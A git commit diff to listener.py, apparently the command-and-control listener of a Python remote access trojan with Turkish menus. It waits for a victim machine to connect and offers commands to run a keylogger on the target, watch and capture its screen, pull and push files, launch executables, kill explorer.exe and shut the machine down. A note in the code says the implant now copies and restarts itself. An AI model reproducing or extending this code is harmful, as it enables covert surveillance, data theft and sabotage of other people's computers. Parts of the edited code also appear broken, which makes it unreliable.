94874ba2267689c24f8fafaa2b13a26480503899
alprens <alpereng2726ag@gmail.com>
2025-01-31 22:50:16 +0300

    Update listener.py

--- listener.py
+++ listener.py
@@ -2,7 +2,7 @@ import socket
 import time
 from colorama import Fore,Back,Style,init
 import os
-
+port=int(input("hangi portu dinlemek istiyorsunuz?:"))
 
 init()
 
@@ -20,9 +20,8 @@ def prens():
 
 
 def shell():
-    print(Fore.RESET+'''
-  EMİRLER
-  
+
+  print(Fore.RESET+"""
   
 ========          ========            =========
 KOMUTLAR          AÇIKLAMA              KULLANIMI
@@ -30,68 +29,67 @@ KOMUTLAR          AÇIKLAMA              KULLANIMI
   
 DOSYA İŞLEMLERİ  
     ---------------------------
-    touch:dosya oluşturur,  K:    touch dosyaadı.dosyauzantısı
-    rm:dosya kaldırır,      K:     rm    dosya.adı.dosyauzantısı
-    cd:dizin değiştirilmesini sağlar,  K: cd istenilen_dizin_ismi yada istenilen_dizin_yolu
-    back:üst dizine gider,  K:    back
-    cat:dosya okunmasını sağlar,  K: cat dosyaadı.dosyauzantısı
-    change:bir dosyanın üzerine yazar,  K:  (change dosyaadı.dosyauzantısı), (yazdır=kendi dizinindeki dosyaadı.dosyauzantısı)
-    ls:dizindeki dosyaları sıralar:,   K: ls
-    pwd:çalışılan dizini  gösterir, K: pwd
+    +touch:dosya oluşturur,  K:    touch dosyaadı.dosyauzantısı
+    +rm:dosya kaldırır,      K:     rm    dosya.adı.dosyauzantısı
+    +cd:dizin değiştirilmesini sağlar,  K: cd istenilen_dizin_ismi yada istenilen_dizin_yolu
+    +back:üst dizine gider,  K:    back
+    +cat:dosya okunmasını sağlar,  K: cat dosyaadı.dosyauzantısı
+    +change:bir dosyanın üzerine yazar,  K:  (change dosyaadı.dosyauzantısı), (yazdır=kendi dizinindeki dosyaadı.dosyauzantısı)
+    +ls:dizindeki dosyaları sıralar:,   K: ls
+    +pwd:çalışılan dizini  gösterir, K: pwd
     
 
 İZLEME VE KAYIT
     ------------------
-    screenshot: ekran görüntüsü alır, K: screenshot dosyaadı.png NOT: bulunduğun dizindeki konuma ss alır DİKKAT!
-    screenshare: ekranı izlemeye başlar, K: screenshare
-    stopscreen: ekran izlemeyi kapatır, K: stopscreen
-    startklog:karşı sistemde keylogger başlatır,  K: startklog
-    stopklog: keyloggerı durdurur,  K:stopklog
+%80 screenshot: ekran görüntüsü alır, K: screenshot dosyaadı.png NOT: bulunduğun dizindeki konuma ss alır DİKKAT!
+%60 screenshare: ekranı izlemeye başlar, K: screenshare
+    +stopscreen: ekran izlemeyi kapatır, K: stopscreen
+    -startklog:karşı sistemde keylogger başlatır,  K: startklog
+    -stopklog: keyloggerı durdurur,  K:stopklog
     
     
 DOSYA YÜKLEME İNDİRME VE YÜRÜTME
       -------------------------
-      sniff:karşı sistemdeki dosyaları indirir, K:sniff dosyaadı.dosyauzantısı
-      send:karşı sisteme dosya gönder, K:send dosyaadı.dosyauzantısı
-      open:karşı sistemdeki istenilen yürütülebilir dosyayı açar, K:open dosyaadı.dosyauzantısı
-      url:web sitesi açar, K: url <url>
+ %80  sniff:karşı sistemdeki dosyaları indirir, K:sniff dosyaadı.dosyauzantısı
+ %80 send:karşı sisteme dosya gönder, K:send dosyaadı.dosyauzantısı
+      -open:karşı sistemdeki istenilen yürütülebilir dosyayı açar, K:open dosyaadı.dosyauzantısı
+      +url:web sitesi açar, K: url <url>
       
       
 SES KOMUTLARI
   ------------------
   
-  sesfull:sesi fuller, K: sesfull
-  seskapat: sesi kapatır, K: seskapat
-  playsound: karşı sistemde ses çalıştırır, K:playsound dosyaadı.mp3     #PROTOTİP
+  -sesfull:sesi fuller, K: sesfull
+  -seskapat: sesi kapatır, K: seskapat
+  -playsound: karşı sistemde ses çalıştırır, K:playsound dosyaadı.mp3     #PROTOTİP
   
   
   
 TROLL  
   ---------------------
-    
-    mesaj:ekrana istenilen mesajı bırakır, K:mesaj merhaba bu bir deneme yazısı       #PROTOTİP
-    spam:masaüstünde dosya yada mesaj spamlar,K: 1=(spam mesaj deneme mesajı) 2=(spam dosya deneme.txt)   #PROTOTİP
-    background:arkaplanı değiştirir, K: background dosyaadı_dosyauzantısı   #PROTOTİP
-    shutdown: bilgisayarı kapatır,K: shutdown  
-    
+    +ekranı dondur:explorer exeyi öldürür, K:
+    -mesaj:ekrana istenilen mesajı bırakır, K:mesaj merhaba bu bir deneme yazısı       #PROTOTİP
+    -spam:masaüstünde dosya yada mesaj spamlar,K: 1=(spam mesaj deneme mesajı) 2=(spam dosya deneme.txt)   #PROTOTİP
+    -background:arkaplanı değiştirir, K: background dosyaadı_dosyauzantısı   #PROTOTİP
+    +kapat: bilgisayarı kapatır,K: kapat  
     NOT:bu komutlar sadece troll amaçlı değildir (:
   
   
 SELF YIKIM :
   ---------------------
 
-ruin:kendini yok eder,  K: ruin      NOT:bu sadece kendini yok eder diğer kalan kalıntıları rm komutu ile el ile temizlemeniz lazım   #PROTOTİP
+-ruin:kendini yok eder,  K: ruin      NOT:bu sadece kendini yok eder diğer kalan kalıntıları rm komutu ile el ile temizlemeniz lazım   #PROTOTİP
         
-          ''')
+          """)
 
 
 
 #dinleme--------------------------------------------------------
 baglantı =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-baglantı.bind(("0.0.0.0",2505))
+baglantı.bind(("0.0.0.0",port))
 baglantı.listen(1)
 prens()
-print("sunucu dinleniyor")
+print("sunucu dinlemede...")
 
 client ,addr =baglantı.accept()
 print(client,addr)
@@ -99,12 +97,19 @@ print(client,addr)
 print("yardım için"+Fore.GREEN+" yardım "+Fore.RESET+"yazın")
 #dinleme--------------------------------------------------------
 
+print("shock eklentisi kalktı artık kod kendini kopyalar ve kendisi tek parça halinde kendini başlatır")
 
 #cmd-----------------------------------------------------------
 while True:
 #gönderilen------------------------------------------------------
+
   client.send("terminal".encode("utf-8"))
-  terminal=client.recv(1024).decode("utf-8")
+  terminal=client.recv(65536).decode("utf-8")
+       
+
+  
+  #burası başlangıç işleri=======================================
+  
   emir=  input(Fore.RED+"PRENS>"+terminal+":")
   
   if not emir:
@@ -121,7 +126,12 @@ while True:
        
   if emir=="yardım":
     shell()
-        
+  """
+  if emir.startswith("cmd"):
+    client.send(emir.encode("utf-8"))
+    print(client.recv(16384))
+    continue
+  """
   if emir =="nerdeyim":
     dosyalar=os.listdir(".")
     print(dosyalar)
@@ -136,19 +146,23 @@ while True:
      screen.start_server()
     except Exception as e:
       print(e)
-      
+  
       
       
   if emir.startswith("send"):
     senddosya=emir.split()
     senddosya=senddosya[1]
-    client.send(f"sender {senddosya}".encode("utf-8"))
-    time.sleep(2)
+    client.send(f"gonder {senddosya}".encode("utf-8"))
+    print("dosya açıldı")
     with open(senddosya,"rb")as send:
       while chunk:=send.read(16384):
         client.send(chunk)  
+        print("gönderme kısmı")
+      client.send(b"EOF")
+      print("gönderme bitti")
     
-    
+
+
   client.send(emir.encode("utf-8"))
   
 #gönderilen----------------------------------------------
@@ -159,44 +173,71 @@ while True:
 #gelen--------------------------------------------------
   gelenveri=client.recv(16384).decode("utf-8")
   
+  if emir == "ls":
+        try:
+            client.settimeout(1.0)
+            while True:
+                try:
+                    ls_verisi = client.recv(16384) 
+                    if not ls_verisi:
+                        break  
+                    print(ls_verisi.decode("utf-8"))  
+                except socket.timeout:
+                    print("Zaman aşımı, ls verisi gelmedi.")
+                    break 
+        except Exception as e:
+            print(f"ls komutunda hata oluştu: {e}")
+        finally:
+            client.settimeout(None)
+  if gelenveri=="izleme durduruldu":
+    print(gelenveri)
+    try:
+      screen.stop_server()
+    except Exception as e:
+      print(e)
+      
+
   if gelenveri.startswith("DOSYAGELDİ"):
     print("Dosya açılıyor.")
     filename = gelenveri.split()[1]
 
     try:
-        # Soket zaman aşımını 10 saniye olarak ayarlıyoruz
-        client.settimeout(2.0)  # 10 saniyelik timeout
+     
+        client.settimeout(2.0)  
 
         with open(filename, "wb") as dosya:
             while True:
                 try:
-                    data = client.recv(16384)  # 16KB'lık veri al
-                    if not data or data == b"":  # Veri bitmişse
+                    data = client.recv(16384) 
+                    if not data or data == b"": 
                         print("Veri bitti.")
                         break
                     
-                    # Dosya transferi bitiş mesajı kontrolü
-                    if data == b"dosyabittiemmi":
+                   
+                    if data.startswith(b"EOF"):
                         print("Dosya transferi tamamlandı.")
+                        dosya.close()
                         break
 
-                    dosya.write(data)  # Veri yazma
+                    dosya.write(data)
                     print("Data yazılıyor...")
                 
                 except socket.timeout:
                     print("Zaman aşımı, veri gelmedi.")
+                    dosya.close()
                     break
                 except ConnectionResetError:
                     print("Bağlantı istemci tarafından kapatıldı.")
                     break
-
+    except socket.timeout:
+      break
         
         
     except Exception as e:
         print(f"Dosya kaydetme hatası: {e}")
 
     finally:
-        # Soket zaman aşımını iptal ediyoruz, böylece başka işlemler için kullanılabilir
+       
         client.settimeout(None)
 
     
